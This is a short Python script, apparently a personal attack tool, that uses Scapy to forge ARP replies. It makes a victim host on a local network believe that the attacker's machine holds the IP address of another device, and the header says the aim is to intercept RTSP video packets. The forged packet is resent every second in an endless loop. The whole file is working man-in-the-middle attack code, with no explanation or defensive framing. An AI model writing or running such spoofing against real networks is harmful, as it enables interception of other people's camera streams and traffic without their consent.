# Scapy ARP poisoning to intercept RTSP packets

from time import sleep
from scapy.all import Ether, ARP, sendp

macAttacker = "84:fd:d1:a5:b7:43"
ipAttacker = "192.168.1.3"

macVictim = "84:fd:d1:fd:6b:00"
ipVictim = "192.168.1.2"

ipToSpoof = "192.168.1.108"

arp = Ether() / ARP()
arp[Ether].src = macAttacker
arp[ARP].hwsrc = macAttacker
arp[ARP].psrc = ipToSpoof
arp[ARP].hwdst = macVictim
arp[ARP].pdst = ipVictim

while True:
    sendp(arp, iface="wlp0s20f3")
    sleep(1)
